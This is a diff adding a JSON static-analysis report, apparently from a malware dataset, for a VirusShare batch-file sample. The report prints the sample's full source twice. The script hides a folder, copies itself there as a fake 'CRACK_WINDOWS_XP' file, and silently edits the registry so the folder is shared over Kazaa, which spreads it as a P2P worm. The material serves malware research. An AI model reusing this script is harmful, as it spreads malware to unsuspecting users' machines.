@@ -1,0 +1,60 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str"
+        },
+        "macro": "@echo off\nctty nul\nmd c:\\CheckSystem\nattrib +h c:\\CheckSystem\ncopy CRACK_~1.BAT c:\\CheckSystem\\CRACK_WINDOWS_XP.EXE.BAT\n\n@echo off\n@echo REGEDIT4>%TEMP%\\troj.reg\n\n@echo [HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg\n@echo \"Dir0\"=\"012345:c:\\\\CheckSystem\">>%TEMP%\\troj.reg\n\n@echo [HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg\n@echo \"Dir1\"=\"012345:d:\\\\Kazzaaa\">>%TEMP%\\troj.reg\n\n@echo [HKEY_USERS\\.DEFAULT\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg\n@echo \"Dir0\"=\"012345:c:\\\\CheckSystem\">>%TEMP%\\troj.reg\n\n@echo [HKEY_USERS\\.DEFAULT\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg\n@echo \"Dir1\"=\"012345:d:\\\\Kazzaaa\">>%TEMP%\\troj.reg\n\nregedit /s %TEMP%\\troj.reg\nrem del %TEMP%\\troj.reg\nctty con\nexit\n"
+    },
+    "filename": "VirusShare_fd66b7f422426bda048896e5b5b16025",
+    "filesize": 759,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "fd66b7f422426bda048896e5b5b16025",
+        "sha1": "327779d5bdc6d61032bb7014cc9a8800dbba6c5b",
+        "sha256": "3bceaa9c2b0be147951a180f88ac06b983e73e447c460277c6daa5b29547d84e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "ctty nul",
+            "md c:\\CheckSystem",
+            "attrib +h c:\\CheckSystem",
+            "copy CRACK_~1.BAT c:\\CheckSystem\\CRACK_WINDOWS_XP.EXE.BAT",
+            "@echo off",
+            "@echo REGEDIT4>%TEMP%\\troj.reg",
+            "@echo [HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg",
+            "@echo \"Dir0\"=\"012345:c:\\\\CheckSystem\">>%TEMP%\\troj.reg",
+            "@echo [HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg",
+            "@echo \"Dir1\"=\"012345:d:\\\\Kazzaaa\">>%TEMP%\\troj.reg",
+            "@echo [HKEY_USERS\\.DEFAULT\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg",
+            "@echo \"Dir0\"=\"012345:c:\\\\CheckSystem\">>%TEMP%\\troj.reg",
+            "@echo [HKEY_USERS\\.DEFAULT\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg",
+            "@echo \"Dir1\"=\"012345:d:\\\\Kazzaaa\">>%TEMP%\\troj.reg",
+            "regedit /s %TEMP%\\troj.reg",
+            "rem del %TEMP%\\troj.reg",
+            "ctty con",
+            "exit"
+        ],
+        "file": {
+            "@echo \"Dir0\"=\"012345:c:\\\\CheckSystem\">>%TEMP%\\troj.reg": "Registry",
+            "@echo \"Dir1\"=\"012345:d:\\\\Kazzaaa\">>%TEMP%\\troj.reg": "Registry",
+            "@echo REGEDIT4>%TEMP%\\troj.reg": "Registry",
+            "@echo [HKEY_CURRENT_USER\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg": "Registry",
+            "@echo [HKEY_USERS\\.DEFAULT\\Software\\Kazaa\\LocalContent]>>%TEMP%\\troj.reg": "Registry",
+            "regedit /s %TEMP%\\troj.reg": "Registry",
+            "rem del %TEMP%\\troj.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.280143",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
